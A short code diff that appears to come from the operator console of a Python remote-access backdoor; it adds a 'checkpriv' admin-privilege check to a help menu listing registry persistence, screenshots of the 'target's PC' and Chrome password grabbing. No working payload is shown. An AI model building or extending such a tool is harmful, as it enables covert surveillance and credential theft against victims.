@@ -81,6 +81,7 @@ def target_communication():
                 persistence *RegName* *fileName*    --> Create Persistence In Registry
 		screenshot                          --> screenshoot the target's PC
 		grabchrome                          --> grab chrome passwords
+		checkpriv                           --> check for admin privilege
 		''', 'green'))
         else:
             result = reliable_recv()
